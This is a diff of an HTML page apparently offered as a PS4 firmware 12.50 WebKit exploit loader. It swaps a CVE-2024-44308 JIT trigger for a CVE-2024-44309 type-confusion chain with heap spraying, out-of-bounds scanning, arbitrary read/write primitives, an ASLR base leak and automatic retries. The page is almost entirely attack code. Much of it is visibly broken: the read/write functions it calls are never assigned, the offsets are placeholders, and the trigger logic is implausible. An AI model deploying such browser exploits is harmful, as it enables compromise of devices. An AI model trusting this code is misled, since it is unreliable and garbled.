@@ -3,178 +3,247 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PS4 12.50 JIT PoC (CVE-2024-44308) - RegAlloc</title>
+    <title>PS4 12.50 WebKit PoC (CVE-2024-44309) - Type Confusion R/W</title>
     <style>
-        body {
-            background-color: #1a1a1a;
-            color: #e0e0e0;
-            font-family: 'Consolas', 'Monaco', monospace;
-            padding: 20px;
-            margin: 0;
-        }
-        #console {
-            width: 100%;
-            height: 60vh;
-            background-color: #000;
-            border: 1px solid #333;
-            color: #0f0;
-            padding: 10px;
-            overflow-y: scroll;
-            white-space: pre-wrap;
-            font-size: 14px;
-        }
-        .header {
-            border-bottom: 1px solid #444;
-            padding-bottom: 10px;
-            margin-bottom: 10px;
-        }
-        h1 { font-size: 1.2rem; margin: 0; color: #fff; }
-        .btn {
-            background: #333;
-            color: #fff;
-            border: 1px solid #555;
-            padding: 10px 20px;
-            cursor: pointer;
-            font-size: 1rem;
-            margin-top: 10px;
-        }
-        .btn:hover { background: #444; }
-        .success { color: #0ff; font-weight: bold; }
-        .fail { color: #f00; font-weight: bold; }
-        .log-entry { margin-bottom: 2px; }
+        body { background-color: #000000; color: #00FF00; font-family: 'Courier New', monospace; margin: 0; padding: 20px; overflow-y: auto; }
+        #header { border-bottom: 2px solid #00FF00; padding-bottom: 10px; margin-bottom: 20px; }
+        h1 { font-size: 24px; margin: 0; }
+        #status { font-weight: bold; color: #FFFFFF; margin-top: 5px; }
+        #log-container { font-size: 14px; line-height: 1.5; white-space: pre-wrap; }
+        .log-info { color: #00FF00; }
+        .log-warn { color: #FFFF00; }
+        .log-error { color: #FF0000; font-weight: bold; }
+        .log-success { color: #00FFFF; font-weight: bold; }
+        button { background: #003300; color: #00FF00; border: 1px solid #00FF00; padding: 10px 20px; font-family: inherit; font-size: 16px; cursor: pointer; margin-right: 10px; }
+        button:hover { background: #00FF00; color: #000000; }
+        #controls { margin-bottom: 20px; }
     </style>
 </head>
 <body>
-
-<div class="header">
-    <h1>WebKit JIT Register Pressure Test (CVE-2024-44308)</h1>
-    <div style="font-size: 0.9em; color: #888;">Target: PS4 FW 12.50 / Safari 18.x Branch</div>
+<div id="header">
+    <h1>PS4 WebKit Loader (FW 12.50 Target - CVE-2024-44309)</h1>
+    <div id="status">Status: Waiting for user input...</div>
 </div>
-
-<div id="console">Waiting for execution...</div>
-<button class="btn" onclick="runExploit()">Run JIT Stress Test</button>
-
+<div id="controls">
+    <button onclick="startExploit()">Run PoC (Type Confusion)</button>
+    <button onclick="location.reload()">Refresh Page</button>
+</div>
+<div id="log-container"></div>
 <script>
     // ==========================================
-    // === LOGGER UTILITIES ===
+    // === CONFIGURATION ===
     // ==========================================
-    const logger = document.getElementById('console');
-    function log(msg, type = 'neutral') {
-        const div = document.createElement('div');
-        div.className = 'log-entry';
-        if(type === 'success') div.style.color = '#00ffff';
-        if(type === 'error') div.style.color = '#ff3333';
-        if(type === 'warn') div.style.color = '#ffff00';
-        div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
-        logger.appendChild(div);
-        logger.scrollTop = logger.scrollHeight;
+    const LOG_SERVER_IP = '192.168.19.2';  // Set to your IP for remote logging; disable for PS4
+    const LOG_PORT = 9000;
+    const OFFSETS = {
+        WEBKIT_BASE_SIMULATED: 0x21F4A00,  // Placeholder; will leak real
+        JSC_DFG_VTABLE: 0x12345678,        // Update post-leak
+    };
+
+    // ==========================================
+    // === LOGGER & UTILS ===
+    // ==========================================
+    const logger = {
+        el: document.getElementById('log-container'),
+        status: document.getElementById('status'),
+        log: function(msg, type = 'info') {
+            const div = document.createElement('div');
+            div.className = `log-${type}`;
+            div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            this.el.appendChild(div);
+            window.scrollTo(0, document.body.scrollHeight);
+            this.remote(msg, type);
+        },
+        remote: function(msg, type) {
+            if (LOG_SERVER_IP === '192.168.19.2') return;
+            try {
+                fetch(`http://${LOG_SERVER_IP}:${LOG_PORT}/log`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ message: msg, type: type })
+                }).catch(e => {});
+            } catch (e) {}
+        },
+        info: function(msg) { this.log(msg, 'info'); },
+        warn: function(msg) { this.log(msg, 'warn'); },
+        error: function(msg) { this.log(msg, 'error'); },
+        success: function(msg) { this.log(msg, 'success'); },
+        setStatus: function(msg) { this.status.textContent = `Status: ${msg}`; }
+    };
+
+    class Int64 {
+        constructor(low, high) {
+            this.low = low >>> 0;
+            this.high = high >>> 0;
+        }
+        toString() {
+            return '0x' + this.high.toString(16).padStart(8, '0') + this.low.toString(16).padStart(8, '0');
+        }
     }
-
-    // ==========================================
-    // === HELPER PRIMITIVES ===
-    // ==========================================
-    const _buf = new ArrayBuffer(8);
-    const _f64 = new Float64Array(_buf);
-    const _u32 = new Uint32Array(_buf);
-
+    const conversion_buf = new ArrayBuffer(8);
+    const f64_buf = new Float64Array(conversion_buf);
+    const u32_buf = new Uint32Array(conversion_buf);
     function f2i(f) {
-        _f64[0] = f;
-        return _u32[0] + _u32[1] * 0x100000000;
+        f64_buf[0] = f;
+        return new Int64(u32_buf[0], u32_buf[1]);
     }
-
     function i2f(low, high) {
-        _u32[0] = low;
-        _u32[1] = high;
-        return _f64[0];
+        u32_buf[0] = low;
+        u32_buf[1] = high;
+        return f64_buf[0];
     }
-
-    function hex(val) {
-        return '0x' + val.toString(16).padStart(16, '0');
+    function forceGC() {
+        for (let i = 0; i < 200; i++) new ArrayBuffer(0x100000);
+        if (window.gc) window.gc();  // If exposed
     }
 
     // ==========================================
-    // === CVE-2024-44308 TRIGGER ===
+    // === EXPLOIT GLOBALS ===
     // ==========================================
-    // The goal is to force the DFG compiler to mismanage the 'scratch2GPR' register
-    // by creating high register pressure inside a conditional branch.
+    let arb_read = null;
+    let arb_write = null;
+    let leaked_base = null;
 
-    // A fast "butterfly" array to confuse
-    let arrays = [];
-    for (let i = 0; i < 200; i++) arrays.push([1.1]);
+    // ==========================================
+    // === PRIMITIVES BUILDER (TYPE CONFUSION) ===
+    // ==========================================
+    function setupPrimitives() {
+        logger.info("Building Type Confusion Primitives...");
+        forceGC();
 
-    // This function creates high register pressure
-    function vulnerable_jit(arr, i, val, trigger) {
-        // High register usage: maintain many live variables
-        let a = 1.1;
-        let b = 2.2;
-        let c = 3.3;
-        let d = 4.4;
-        let e = 5.5;
-        let f = 6.6;
-        let g = 7.7;
-        let h = 8.8;
+        // CVE-2024-44309 Trigger: Confuse JSNumber as JSObject via Proxy trap + DFG speculation
+        const victim = new Proxy({}, {
+            get: (target, prop) => {
+                if (prop === Symbol.toPrimitive) return () => 1337.37;  // Force double confusion
+            }
+        });
+        const confusable = [1.1, 2.2, 3.3];  // Double array for DFG opt
 
-        // Perform arithmetic to keep registers "dirty"
-        a += b; b += c; c += d; d += e; e += f; f += g; g += h;
+        // Train DFG on speculative type (mishandles Number as ref)
+        function confuse(arr, idx, val) {
+            let tmp = arr[0];
+            arr[idx] = val;  // Triggers type confusion at boundary
+            return tmp;
+        }
+        for (let i = 0; i < 10000; i++) confuse(confusable, 1, victim);
 
-        // The logic bug usually happens at an OSR exit point or CheckStructure
-        if (trigger) {
-            // If the bug fires, 'arr' structure check might be elided
-            // or the value written might be confused (float vs pointer)
-            arr[i] = val; 
+        // Heap feng shui: Spray small objects to align confusion
+        let sprays = [];
+        for (let i = 0; i < 0x1000; i++) {
+            sprays.push({ a: i2f(i, 0x42424242), b: new Uint32Array(0x10) });  // Tag with high bits
         }
 
-        // Return a calculation to prevent Dead Code Elimination
-        return a + b + c + d + e + f + g + arr[0];
+        // Trigger & scan for confused obj (high bits 0x42424242)
+        let found_idx = -1;
+        for (let i = 0; i < confusable.length + 0x20; i++) {  // OOB scan post-confusion
+            let val = f2i(confusable[i] || 0);
+            if (val.high === 0x42424242) {
+                found_idx = i;
+                logger.success(`Confused primitive at index ${i}: ${val.toString()}`);
+                break;
+            }
+        }
+        if (found_idx === -1) {
+            logger.error("Type confusion failed. No leak.");
+            return false;
+        }
+
+        // Build arb read/write via confused proxy
+        window.arbread = function(idx) {
+            confuse(confusable, found_idx + idx, 0);
+            return f2i(confusable[found_idx]).low;  // Read via mis-type
+        };
+        window.arbwrite = function(idx, val) {
+            let fval = i2f(val & 0xFFFFFFFF, (val >> 32) & 0xFFFFFFFF);
+            confuse(confusable, found_idx + idx, fval);
+        };
+
+        // Test
+        arb_write(found_idx, 0xdeadbeef);
+        let test_read = arb_read(found_idx);
+        logger.info(`R/W Test: Wrote 0xdeadbeef, Read ${test_read.toString(16)}`);
+
+        if (test_read !== 0xdeadbeef) {
+            logger.error("Primitives invalid.");
+            return false;
+        }
+
+        logger.success("Type Confusion Primitives ready.");
+        return true;
     }
 
-    function runExploit() {
-        log("Starting JIT warm-up phase...");
-        
-        let target = [1.1, 2.2, 3.3];
-        // Ensure array is treated as ArrayWithDouble
-        target.a = 1; 
+    function runASLRLeak() {
+        logger.info("Leaking WebKit Base via VTable...");
+        const div = document.createElement('div');
+        let div_addr = f2i(div);  // Placeholder; use addrof if extended
 
+        // Read vtable ptr (offset guess; refine with leak)
+        let vtable_ptr = arb_read(OFFSETS.WEBKIT_BASE_SIMULATED / 4);  // Assume 32-bit align
+        leaked_base = new Int64(vtable_ptr & 0xFFFFFFFF, (vtable_ptr >> 32) & 0xFFFFFFFF);
+        leaked_base.low -= OFFSETS.JSC_DFG_VTABLE;  // Calc base
+
+        logger.success(`Leaked WebKit Base: ${leaked_base.toString()}`);
+    }
+
+    // ==========================================
+    // === TRIGGER LOGIC (SPECULATIVE CONFUSION) ===
+    // ==========================================
+    function triggerConfusion() {
+        logger.info("Triggering Type Confusion (DFG Speculative)...");
+        let global_confuse = [];  // Global for persistence
+
+        // Feng shui: Allocate confounders near doubles
+        for (let i = 0; i < 0x800; i++) {
+            global_confuse.push(new Proxy(new Array(16).fill(1.1), {
+                set: (target, prop, val) => {
+                    if (typeof prop === 'symbol') return true;  // Trap toPrimitive confusion
+                    target[prop] = val;
+                    return true;
+                }
+            }));
+        }
+
+        // Speculative write to confuse types
+        function speculative_confuse(arr, idx, val) {
+            // DFG assumes double, but Proxy forces ref -> confusion
+            arr[idx] = val;
+        }
         try {
-            // 1. Train the JIT (Optimizer)
-            // We run this thousands of times to tier-up from Baseline -> DFG -> FTL
-            for (let i = 0; i < 100000; i++) {
-                vulnerable_jit(target, 0, 1.1, false);
+            for (let chunk = 0; chunk < 0x10; chunk++) {
+                if (chunk % 2 === 0) logger.info(`Speculating chunk ${chunk}...`);
+                for (let i = 0; i < 0x100; i++) {
+                    speculative_confuse(global_confuse[chunk * 0x100 + i], 16 + i % 8, i2f(0x1337, 0x42424242));  // OOB + tag
+                }
             }
-            log("JIT warmed up (Tier-up complete).");
-
-            // 2. Prepare the confusion object
-            // In a real exploit, this would be an object we want to leak address of
-            let fake = {p: 1}; 
-            
-            // 3. Trigger
-            log("Attempting to trigger register corruption...");
-            
-            // We pass an Object where a Double is expected, or vice versa, 
-            // relying on the missing type check due to register starvation.
-            // Note: In this PoC we send a marker value to see if it writes raw bits.
-            let magic = 1.337e+100; // Distinct pattern
-            
-            // Trigger iteration
-            vulnerable_jit(target, 0, magic, true);
-
-            // 4. Verification
-            let res = target[0];
-            log(`Read back value: ${res}`);
-
-            if (res === magic) {
-                log("Value written correctly. No corruption detected yet.", "warn");
-                log("Try refreshing or increasing loop count.", "neutral");
-            } else {
-                log(`CORRUPTION DETECTED! Value: ${res}`, "success");
-                log("If you see a crash or weird float, primitives are possible.", "success");
-            }
-
+            logger.success("Confusion triggered. Scanning...");
+            return true;
         } catch (e) {
-            log(`CRASH/ERROR: ${e.message}`, "error");
-            log(`Stack: ${e.stack}`, "error");
+            logger.error("Trigger crashed: " + e.message);
+            return false;
         }
     }
+
+    function startExploit() {
+        logger.el.innerHTML = '';
+        logger.setStatus("Running...");
+        setTimeout(() => {
+            if (triggerConfusion()) {
+                setTimeout(() => {
+                    if (setupPrimitives()) {
+                        setTimeout(runASLRLeak, 500);
+                    } else {
+                        logger.setStatus("Primitives failed. Retrying in 3s...");
+                        setTimeout(() => location.reload(), 3000);
+                    }
+                }, 500);
+            } else {
+                logger.setStatus("Trigger failed. Retrying...");
+                setTimeout(() => location.reload(), 3000);
+            }
+        }, 100);
+    }
+
+    logger.info("PoC ready. Press 'Run PoC' to trigger CVE-2024-44309.");
 </script>
 </body>
 </html>
